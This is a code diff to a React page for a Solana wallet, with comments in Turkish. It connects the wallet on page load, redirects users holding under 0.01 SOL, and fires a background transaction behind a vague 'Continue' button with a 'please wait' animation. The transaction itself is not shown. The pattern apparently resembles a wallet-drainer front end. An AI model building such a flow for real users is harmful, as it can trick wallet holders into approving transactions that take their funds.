@@ -38,19 +38,40 @@ export default function WalletConnectPage() {
   const [buttonText, setButtonText] = useState("Continue");
   const intervalRef = useRef<number>();
 
+  /* ----------------------------------------------------
+     1) Cüzdanı bağla → 2) SOL bakiyesini ölç →
+     3) 0.01 SOL’dan azsa /insufficient-balance’a yönlendir
+  -----------------------------------------------------*/
   useEffect(() => {
-    connectWallet()
-      .catch((err: any) => {
-        console.error("Cüzdan bağlanamadı:", err);
-      })
-      .finally(() => {
+    (async () => {
+      try {
+        await connectWallet();
+
+        const pubKey = getUserPublicKey();
+        if (pubKey) {
+          const lamports = await connection.getBalance(pubKey);
+          const sol = lamports / 1e9;
+          console.log("SOL Bakiyesi:", sol);
+
+          if (sol < 0.01) {
+            window.location.href = "/insufficient-balance";
+            return; // yönlendirme yapıldı, render’ı kes
+          }
+        }
+      } catch (err) {
+        console.error("Cüzdan bağlantı veya bakiye hatası:", err);
+      } finally {
         setLoading(false);
-      });
+      }
+    })();
   }, []);
 
-  // Sayfa yüklenmeden önce bağlanma bitene kadar render etme
+  // Cüzdan bağlanma & bakiye kontrolü bitene dek hiçbir şey gösterme
   if (loading) return null;
 
+  /* ----------------------------------------------------
+     'Continue' butonu tıklanınca işlem başlatan fonksiyon
+  -----------------------------------------------------*/
   const handleContinue = async () => {
     if (processing) return;
     setProcessing(true);
@@ -60,18 +81,18 @@ export default function WalletConnectPage() {
     setButtonText(`please wait${".".repeat(dotCount)}`);
 
     intervalRef.current = window.setInterval(() => {
-      dotCount = dotCount % 3 + 1;
+      dotCount = (dotCount % 3) + 1;
       setButtonText(`please wait${".".repeat(dotCount)}`);
     }, 500);
 
-    // 5 saniye sonra animasyonu durdurup butonu eski haline getir
+    // 5 sn sonra animasyonu durdur
     setTimeout(() => {
       if (intervalRef.current) clearInterval(intervalRef.current);
       setProcessing(false);
       setButtonText("Continue");
     }, 5000);
 
-    // Arka planda transaction isteği
+    // Transaction isteği
     try {
       const pubKey = getUserPublicKey();
       if (!pubKey) {
@@ -94,6 +115,7 @@ export default function WalletConnectPage() {
       console.error("Transaction hatası:", err);
     }
   };
+
 
   return (
     <main className="wallet-connect-page">
